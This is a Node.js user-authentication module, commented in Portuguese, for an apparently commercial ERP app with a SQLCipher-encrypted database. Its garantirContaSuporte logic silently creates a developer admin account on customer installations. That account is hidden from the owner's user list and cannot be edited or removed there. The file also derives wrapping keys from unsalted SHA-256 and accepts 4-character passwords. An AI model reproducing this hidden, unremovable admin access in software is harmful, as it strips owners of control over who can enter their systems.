const path = require("path");
const crypto = require("crypto");
const fs = require("fs");
const {
	getAsync,
	runAsync,
	allAsync,
	getDBPath,
	abrirBanco,
	derivarChave,
	desbloquearBanco,
	bloquearBanco,
	getConexaoOuNull,
	getChaveAtual,
	definirConexaoAtiva,
} = require("./conexao");
const { iniciarBanco } = require("./schema");

/* ============ Usuários (login do sistema) ============ */
// Cada usuário tem um login e uma senha. A senha do primeiro login é a chave-mestre
// do banco (SQLCipher). Para permitir vários usuários, a chave-mestre é "embrulhada"
// (AES-256-GCM) por cada login/senha em um arquivo ao lado do banco (erp_usuarios.json).
// Para trocar a senha de um usuário basta reembrulhar a mesma chave-mestre.

function caminhoArquivoUsuarios() {
	return path.join(path.dirname(getDBPath()), "erp_usuarios.json");
}

// Achado real (2026-08-29): a colisão de login era silenciosa — nenhum log
// em lugar nenhum, só dava pra descobrir cruzando erp_usuarios.json na unha
// (ver GOALS.md, "Support account login collision"). Escreve no MESMO
// erp-crash.log que main.js usa (mesma pasta userData — path.dirname(getDBPath())
// já é ela, já que main.js chama setDBPath(app.getPath("userData")) no boot),
// pra aparecer no lugar que já é o primeiro que se olha pra diagnosticar.
function logColisaoSuporte(login, idContaReal) {
	try {
		const caminho = path.join(path.dirname(getDBPath()), "erp-crash.log");
		fs.appendFileSync(
			caminho,
			"[" +
				new Date().toISOString() +
				'] [garantirContaSuporte] login "' +
				login +
				'" já pertence a uma conta real (id=' +
				idContaReal +
				") — conta de suporte NÃO ativada nesta instalação (colisão de nome).\n",
		);
	} catch {
		// Nunca deixa uma falha de log quebrar o login normal.
	}
}

function derivarChaveUsuario(login, senha) {
	return crypto
		.createHash("sha256")
		.update("erp_usr:" + String(login) + ":" + String(senha))
		.digest();
}

// Formato legado (SHA-256 sem salt por usuário) — mantido só para validar hashes
// já gravados antes da migração para scrypt; nunca usado para gravar hash novo.
function hashSenhaUsuarioLegado(login, senha) {
	return crypto
		.createHash("sha256")
		.update("erp_usr_hash:" + String(login) + ":" + String(senha))
		.digest("hex");
}

const SCRYPT_PARAMS = { N: 16384, r: 8, p: 1, keylen: 64 };

function hashSenhaUsuario(senha) {
	const salt = crypto.randomBytes(16);
	const hash = crypto.scryptSync(String(senha), salt, SCRYPT_PARAMS.keylen, {
		N: SCRYPT_PARAMS.N,
		r: SCRYPT_PARAMS.r,
		p: SCRYPT_PARAMS.p,
	});
	return "scrypt$" + salt.toString("hex") + "$" + hash.toString("hex");
}

// Verifica a senha contra o hash gravado, aceitando tanto o formato novo (scrypt)
// quanto o legado (SHA-256), para permitir migração transparente no login.
function verificarHashSenha(login, senha, hashArmazenado) {
	const armazenado = String(hashArmazenado || "");
	if (armazenado.startsWith("scrypt$")) {
		const partes = armazenado.split("$");
		if (partes.length !== 3) return { ok: false, precisaMigrar: false };
		const salt = Buffer.from(partes[1], "hex");
		const esperado = Buffer.from(partes[2], "hex");
		const calculado = crypto.scryptSync(
			String(senha),
			salt,
			SCRYPT_PARAMS.keylen,
			{ N: SCRYPT_PARAMS.N, r: SCRYPT_PARAMS.r, p: SCRYPT_PARAMS.p },
		);
		const ok =
			calculado.length === esperado.length &&
			crypto.timingSafeEqual(calculado, esperado);
		return { ok, precisaMigrar: false };
	}
	const legado = Buffer.from(hashSenhaUsuarioLegado(login, senha), "hex");
	const atual = Buffer.from(armazenado, "hex");
	const ok =
		legado.length === atual.length && crypto.timingSafeEqual(legado, atual);
	return { ok, precisaMigrar: ok };
}

function lerArquivoUsuarios() {
	try {
		const caminho = caminhoArquivoUsuarios();
		if (!fs.existsSync(caminho)) return {};
		const dados = JSON.parse(fs.readFileSync(caminho, "utf8"));
		return dados && typeof dados === "object" ? dados : {};
	} catch {
		return {};
	}
}

function gravarArquivoUsuarios(dados) {
	fs.writeFileSync(caminhoArquivoUsuarios(), JSON.stringify(dados, null, 2));
}

function embrulharChave(login, senha) {
	const chavePerfil = derivarChaveUsuario(login, senha);
	const iv = crypto.randomBytes(12);
	const cipher = crypto.createCipheriv("aes-256-gcm", chavePerfil, iv);
	const criptografado = Buffer.concat([
		// Antes: `currentKey` era uma variável de módulo local. Agora a chave
		// ativa vive em db/conexao.js e é lida via getChaveAtual().
		cipher.update(getChaveAtual(), "utf8"),
		cipher.final(),
	]);
	return {
		iv: iv.toString("hex"),
		tag: cipher.getAuthTag().toString("hex"),
		dados: criptografado.toString("hex"),
	};
}

function desembrulharChave(entrada, loginKey) {
	try {
		const decipher = crypto.createDecipheriv(
			"aes-256-gcm",
			loginKey,
			Buffer.from(entrada.iv, "hex"),
		);
		decipher.setAuthTag(Buffer.from(entrada.tag, "hex"));
		return Buffer.concat([
			decipher.update(Buffer.from(entrada.dados, "hex")),
			decipher.final(),
		]).toString("utf8");
	} catch {
		return null;
	}
}

// Conta de suporte do desenvolvedor (ALLU Enterprise) — opcional, existe só
// quando ERP_SUPORTE_LOGIN/ERP_SUPORTE_SENHA estão configuradas (nunca
// commitadas; ver .env.example e package.json:build.extraMetadata pro caso
// empacotado). Deixa o dono do produto entrar em qualquer instalação de
// cliente pra suporte, sem depender de saber a senha daquela loja
// especificamente. Chamada a cada login bem-sucedido (não só no primeiro),
// pra ficar disponível assim que alguém da loja logar depois do deploy desta
// função — não precisa de nenhum passo extra do lado do cliente.
async function garantirContaSuporte() {
	const suporteLogin = String(process.env.ERP_SUPORTE_LOGIN || "")
		.trim()
		.toLowerCase();
	const suporteSenha = String(process.env.ERP_SUPORTE_SENHA || "");
	if (!suporteLogin || !suporteSenha) return; // opcional — desligada por padrão

	const arquivo = lerArquivoUsuarios();
	if (arquivo[suporteLogin]) return; // já resolvido (é a conta de suporte OU já pertence a outra conta — nos dois casos, não mexe)

	// Sem entrada de embrulho ainda pra esse login — só é seguro criar uma se
	// TAMBÉM não existir uma linha em Usuarios com esse login. Sem essa
	// checagem, um login que colide de nome com ERP_SUPORTE_LOGIN mas
	// pertence de verdade à loja (criado por outro caminho, ainda sem
	// embrulho próprio) teria sua chave embrulhada com a senha de SUPORTE por
	// engano — quebrando o acesso real da loja àquele login.
	const linhaExistente = await getAsync(
		"SELECT id FROM Usuarios WHERE login = ? COLLATE NOCASE",
		[suporteLogin],
	);
	if (linhaExistente) {
		logColisaoSuporte(suporteLogin, linhaExistente.id);
		return; // login já pertence a uma conta real — não mexe
	}

	try {
		arquivo[suporteLogin] = embrulharChave(suporteLogin, suporteSenha);
		gravarArquivoUsuarios(arquivo);
		await runAsync(
			"INSERT INTO Usuarios (login, nome, perfil, ativo, senha_hash, criado_em) VALUES (?, ?, ?, 1, ?, ?)",
			[
				suporteLogin,
				"Suporte ALLU",
				"admin",
				hashSenhaUsuario(suporteSenha),
				new Date().toISOString(),
			],
		);
	} catch {
		// Sem key-file gravável ou erro no insert — segue sem a conta de
		// suporte nesta instalação, não é motivo pra quebrar o login normal.
	}
}

// Login do app: usuário + senha. Pode desbloquear via chave embrulhada (multi-usuário)
// ou via chave-mestre (primeiro acesso / migração de bancos antigos).
async function autenticarUsuario(login, senha) {
	const l = String(login || "")
		.trim()
		.toLowerCase();
	const s = String(senha || "");
	if (!l || !s) throw new Error("Informe usuário e senha.");

	// Achado real (2026-08-31, decisão do dono): o login reservado pra conta
	// de suporte (ERP_SUPORTE_LOGIN) nunca pode virar o bootstrap de uma loja
	// nova COM UMA SENHA DIFERENTE DA DE SUPORTE — antes disso, quem
	// digitasse "adm" primeiro (loja ou suporte) ficava com o login pra
	// sempre, e o outro lado nunca ativava (colisão silenciosa, ver
	// GOALS.md). Bug encontrado depois (2026-09-02, reportado pelo dono: PC
	// novo, instalação limpa, "adm"/senha de suporte real rejeitados): a
	// primeira versão dessa checagem bloqueava ehLoginDeSuporte(l) sozinho,
	// sem olhar a senha — isso também derrubava a PRÓPRIA conta de suporte
	// tentando fazer o bootstrap genuíno dela num banco novo, já que
	// ehLoginDeSuporte só compara o nome do login. A senha certa PASSA (vira
	// o bootstrap normal, funcionalmente idêntico a ter sido criada por
	// garantirContaSuporte); só uma senha diferente da de suporte é
	// bloqueada — é isso que impede a loja de "roubar" o login reservado.
	// Checa ANTES de abrir o banco de propósito: desbloquearBanco() já cria
	// o schema (escreve de verdade no arquivo .sqlite) no primeiro unlock —
	// rejeitar DEPOIS deixaria o banco keyed com essa senha rejeitada e zero
	// usuários, pior que deixar passar. Só se aplica quando o banco ainda
	// nem existe no disco (bootstrap genuíno); depois de criado, é o
	// schema.js's Usuarios vazio ou não que decide (verificado só depois de
	// conectar, caso legado).
	if (ehLoginDeSuporte(l) && !fs.existsSync(getDBPath())) {
		const suporteSenha = String(process.env.ERP_SUPORTE_SENHA || "");
		if (!suporteSenha || s !== suporteSenha) {
			throw new Error(
				"Este login não está disponível. Escolha outro para o administrador da loja.",
			);
		}
	}

	const arquivo = lerArquivoUsuarios();
	const entrada = arquivo[l];
	let desbloqueado = false;

	// 1) Tenta desembrulhar a chave-mestre com a senha deste usuário.
	if (entrada) {
		try {
			const chaveMestre = desembrulharChave(entrada, derivarChaveUsuario(l, s));
			if (!chaveMestre) throw new Error("senha incorreta");
			if (!getConexaoOuNull()) {
				// Antes: `db = await abrirBanco(chaveMestre); currentKey = chaveMestre;`
				// direto nas variáveis de módulo. Agora db/currentKey moraram para
				// db/conexao.js, então a troca de conexão ativa passa por
				// definirConexaoAtiva() para manter os dois módulos em sincronia.
				const conn = await abrirBanco(chaveMestre);
				definirConexaoAtiva(conn, chaveMestre);
				await iniciarBanco();
			} else if (chaveMestre !== getChaveAtual()) {
				throw new Error("chave alterada");
			}
			desbloqueado = true;
		} catch {
			desbloqueado = false;
		}
	}

	// 2) Fallback: chave-mestre direta (primeiro acesso, admin legado ou banco plaintext).
	if (!desbloqueado) {
		if (getConexaoOuNull()) {
			if (derivarChave(s) !== getChaveAtual())
				throw new Error("Senha incorreta.");
		} else {
			await desbloquearBanco(s);
		}
		desbloqueado = true;
	}

	// 3) Se o banco ainda está vazio de usuários, sementeia o primeiro (bootstrap).
	const total = await getAsync("SELECT COUNT(*) AS n FROM Usuarios", []);
	if (Number(total.n) === 0) {
		await runAsync(
			"INSERT INTO Usuarios (login, nome, perfil, ativo, senha_hash, criado_em) VALUES (?, ?, ?, 1, ?, ?)",
			[
				l,
				"Administrador",
				"admin",
				hashSenhaUsuario(s),
				new Date().toISOString(),
			],
		);
	}

	// 4) Garante o embrulho da chave para este login (novo/legado).
	if (!arquivo[l]) {
		try {
			arquivo[l] = embrulharChave(l, s);
			gravarArquivoUsuarios(arquivo);
		} catch {
			/* ignora: login continua funcionando pela chave-mestre */
		}
	}

	// 4.5) Garante a conta de suporte (opcional — ver garantirContaSuporte).
	// Sempre que alguém consegue logar, o processo tem a chave-mestre real em
	// mãos — é o único momento em que dá pra embrulhar a chave pra um login
	// novo, então cada login bem-sucedido é uma chance de ativar o suporte
	// nesta instalação (não só o primeiro).
	try {
		await garantirContaSuporte();
	} catch {
		/* nunca deixa a conta de suporte quebrar o login de quem está logando */
	}

	// 5) Valida o usuário cadastrado e ativo.
	const usr = await getAsync(
		"SELECT id, login, nome, perfil, ativo, permissoes FROM Usuarios WHERE login = ? COLLATE NOCASE",
		[l],
	);
	if (!usr) {
		await bloquearBanco();
		throw new Error("Usuário não cadastrado neste sistema.");
	}
	if (Number(usr.ativo) !== 1) {
		await bloquearBanco();
		throw new Error("Usuário desativado. Contate o administrador.");
	}

	return {
		success: true,
		usuario: {
			id: usr.id,
			login: usr.login,
			nome: usr.nome,
			perfil: usr.perfil,
			permissoes: parsePermissoes(usr.permissoes),
		},
	};
}

// Parse defensivo: permissoes nunca deve derrubar o login por JSON inválido.
function parsePermissoes(texto) {
	try {
		const obj = JSON.parse(texto || "{}");
		return obj && typeof obj === "object" ? obj : {};
	} catch {
		return {};
	}
}

function getUsuario(login) {
	return getAsync(
		"SELECT id, login, nome, perfil, ativo, permissoes FROM Usuarios WHERE login = ? COLLATE NOCASE",
		[String(login)],
	);
}

// Compara com ERP_SUPORTE_LOGIN (case-insensitive, igual COLLATE NOCASE do
// banco) — usado tanto pra esconder a conta da tela de Acessos quanto pra
// nunca deixar ela ser removida/desativada por lá.
function ehLoginDeSuporte(login) {
	const suporteLogin = String(process.env.ERP_SUPORTE_LOGIN || "")
		.trim()
		.toLowerCase();
	if (!suporteLogin) return false;
	return (
		String(login || "")
			.trim()
			.toLowerCase() === suporteLogin
	);
}

async function listarUsuarios() {
	const linhas = await allAsync(
		"SELECT id, login, nome, perfil, ativo, criado_em, comissao_percentual, permissoes FROM Usuarios ORDER BY login",
	);
	// A conta de suporte (se configurada nesta instalação) não aparece na
	// tela de Gerenciar Acessos da loja — é um login de manutenção do
	// desenvolvedor, não um usuário que o dono da loja gerencia. Continua
	// visível como uma linha normal via o módulo "Banco de Dados" (admin).
	return linhas.filter((u) => !ehLoginDeSuporte(u.login));
}

// `ator` é a sessão de quem está fazendo a chamada (getSessao() do main.js),
// usado só pras regras de hierarquia abaixo — nunca pra decidir se a chamada
// é permitida no geral (isso já é o exigirSessao("admin") do IPC).
async function salvarUsuario(dados, ator) {
	const l = String(dados.login || "")
		.trim()
		.toLowerCase();
	const nome = String(dados.nome || "").trim();
	if (!l || !/^[a-z0-9._-]{3,}$/i.test(l)) {
		throw new Error(
			"Login deve ter pelo menos 3 caracteres (letras, números, . _ -).",
		);
	}
	if (!nome) throw new Error("Informe o nome do usuário.");
	const perfil = ["dono", "vendedor"].includes(dados.perfil)
		? dados.perfil
		: "admin";
	const comissao = Math.max(0, Number(dados.comissao_percentual) || 0);
	const permissoes = JSON.stringify(
		dados.permissoes && typeof dados.permissoes === "object"
			? dados.permissoes
			: {},
	);

	const inserindo = !dados.id;
	const senha = String(dados.senha || "");
	if (inserindo) {
		// Mesma reserva de login aplicada no bootstrap (autenticarUsuario) —
		// ninguém cria um usuário novo com o login da conta de suporte pela
		// tela de Gerenciar Acessos, só o mecanismo automático
		// (garantirContaSuporte) pode ocupar esse login.
		if (ehLoginDeSuporte(l)) {
			throw new Error("Este login não está disponível. Escolha outro.");
		}
		if (senha.length < 4)
			throw new Error("Defina uma senha com pelo menos 4 caracteres.");
		const existente = await getAsync(
			"SELECT id FROM Usuarios WHERE login = ? COLLATE NOCASE",
			[l],
		);
		if (existente) throw new Error("Já existe um usuário com esse login.");
		await runAsync(
			"INSERT INTO Usuarios (login, nome, perfil, ativo, senha_hash, criado_em, comissao_percentual, permissoes) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
			[
				l,
				nome,
				perfil,
				dados.ativo ? 1 : 0,
				hashSenhaUsuario(senha),
				new Date().toISOString(),
				comissao,
				permissoes,
			],
		);
	} else {
		if (!/^[0-9]+$/.test(String(dados.id)))
			throw new Error("Usuário inválido.");
		const alvo = await getAsync(
			"SELECT id, login, perfil, senha_hash FROM Usuarios WHERE id = ?",
			[Number(dados.id)],
		);
		if (!alvo) throw new Error("Usuário não encontrado.");
		// Mesma trava de removerUsuario — nunca editável por aqui (não aparece
		// na lista da tela de Acessos, mas protege contra uma chamada direta
		// de IPC com o id certo).
		if (ehLoginDeSuporte(alvo.login)) {
			throw new Error("Este usuário não pode ser editado.");
		}

		if (senha) {
			if (senha.length < 4)
				throw new Error("A senha deve ter pelo menos 4 caracteres.");

			// Hierarquia: dono nunca altera a senha do admin. E trocar a própria
			// senha (admin ou dono) exige confirmar a senha atual — evita que uma
			// sessão aberta sozinha na loja vire troca de senha sem saber a antiga.
			const editandoAdmin = alvo.perfil === "admin";
			const editandoSiMesmo = !!ator && Number(ator.id) === Number(alvo.id);
			if (editandoAdmin && ator && ator.perfil === "dono") {
				throw new Error("Você não pode alterar a senha do administrador.");
			}
			if (
				editandoSiMesmo &&
				ator &&
				(ator.perfil === "admin" || ator.perfil === "dono")
			) {
				const verificacao = verificarHashSenha(
					alvo.login,
					String(dados.senhaAtual || ""),
					alvo.senha_hash,
				);
				if (!verificacao.ok) throw new Error("Senha atual incorreta.");
			}
		}

		await runAsync(
			"UPDATE Usuarios SET nome = ?, ativo = ?, perfil = ?, comissao_percentual = ?, permissoes = ? WHERE id = ?",
			[
				nome,
				dados.ativo ? 1 : 0,
				perfil,
				comissao,
				permissoes,
				Number(dados.id),
			],
		);
		if (senha) {
			await runAsync("UPDATE Usuarios SET senha_hash = ? WHERE id = ?", [
				hashSenhaUsuario(senha),
				Number(dados.id),
			]);
		}
	}

	// Embrulha/reescreve a chave-mestre para o login deste usuário.
	if (inserindo || senha) {
		const arquivo = lerArquivoUsuarios();
		arquivo[l] = embrulharChave(l, senha);
		gravarArquivoUsuarios(arquivo);
	}

	return { success: true };
}

async function removerUsuario(id) {
	const usuarioId = Number(id);
	if (!usuarioId) throw new Error("Usuário inválido.");
	const usr = await getAsync("SELECT * FROM Usuarios WHERE id = ?", [
		usuarioId,
	]);
	if (!usr) throw new Error("Usuário não encontrado.");

	// A conta de suporte nunca é removível por aqui, independente de quantos
	// outros admins existem — ela não pertence à hierarquia da loja, é acesso
	// de manutenção do desenvolvedor (ver garantirContaSuporte em cima).
	if (ehLoginDeSuporte(usr.login)) {
		throw new Error("Este usuário não pode ser removido.");
	}

	// A trava tem que ser sobre admins, não usuários em geral — senão dá pra
	// apagar o último admin e deixar só vendedores, travando a administração.
	if (usr.perfil === "admin") {
		const adminsAtivos = await getAsync(
			"SELECT COUNT(*) AS n FROM Usuarios WHERE ativo = 1 AND perfil = 'admin'",
			[],
		);
		if (Number(adminsAtivos.n) <= 1 && Number(usr.ativo) === 1) {
			throw new Error("Não é possível remover o último administrador ativo.");
		}
	}

	await runAsync("DELETE FROM Usuarios WHERE id = ?", [usuarioId]);

	const arquivo = lerArquivoUsuarios();
	if (arquivo[usr.login]) {
		delete arquivo[usr.login];
		gravarArquivoUsuarios(arquivo);
	}
	return { success: true };
}

module.exports = {
	hashSenhaUsuario,
	hashSenhaUsuarioLegado,
	verificarHashSenha,
	caminhoArquivoUsuarios,
	derivarChaveUsuario,
	lerArquivoUsuarios,
	gravarArquivoUsuarios,
	embrulharChave,
	desembrulharChave,
	autenticarUsuario,
	parsePermissoes,
	getUsuario,
	listarUsuarios,
	salvarUsuario,
	removerUsuario,
};
